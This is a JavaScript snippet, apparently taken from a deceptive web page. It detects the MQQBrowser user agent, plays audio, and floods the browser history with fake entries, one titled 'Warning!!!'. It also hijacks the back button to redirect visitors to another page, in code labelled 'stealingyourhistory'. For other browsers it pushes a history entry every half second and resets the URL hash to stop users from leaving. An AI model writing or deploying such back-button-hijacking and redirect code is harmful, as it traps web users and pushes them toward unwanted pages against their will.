```javascript
var sUa = navigator.userAgent; //MQQBrowser
        if(sUa.indexOf("MQQBrowser")!=-1)
        {
            history.pushState({ page: 1 }, "Warning!!!", "#qbb");
            window.onhashchange = function (event) {window.location.hash = "qbb";};
            document.getElementById('mess').play();
            window.history.pushState('1main.php', 'gogogo', '1main.php');
            window.history.pushState('1main.php', 'disone', '1main.php');

            window.addEventListener("popstate", function(e) {
                if (document.URL.indexOf("1main.html") >= 0) {
                    window.history.pushState('1main.php', 'gogogo', '1main.php');
                    window.history.pushState('1main.php', 'disone', '1main.php');

                }
            });

            (function(window, location) {

                history.replaceState(null, document.title, location.pathname+"#!/stealingyourhistory");
                history.pushState(null, document.title, location.pathname);

                window.addEventListener("popstate", function() {

                    if(location.hash === "#!/stealingyourhistory") {
                        history.replaceState(null, document.title, location.pathname);
                        setTimeout(function(){
                            location.replace("/ym/zzzqt.htm");
                        },0);
                    }

                }, false);


            }(window, location));
        }
        else
        {
            isclick = false;
            history.pushState({page: 1}, "", "#nbb");
            history.pushState({page: 2}, "", "#nbb");
            history.pushState({page: 3}, "", "#nbb");
            i = 3;
            setInterval(function () {
                if (isclick == false) {
                    history.pushState({page: ++i}, "", "#nbb");
                } else {
                    isclick = false;
                }
            }, 500);
            $(document).ready(function(){
                $('a').click(function(){
                    isclick = true
                })
            });

            window.onhashchange = function (event) {
                myhash = window.location.hash;
                history.pushState({page: ++i}, "", "#nbb");
                if (myhash != '#nbb') {
                    window.location.hash = 'nbb';
                }
            };
        }
```javascript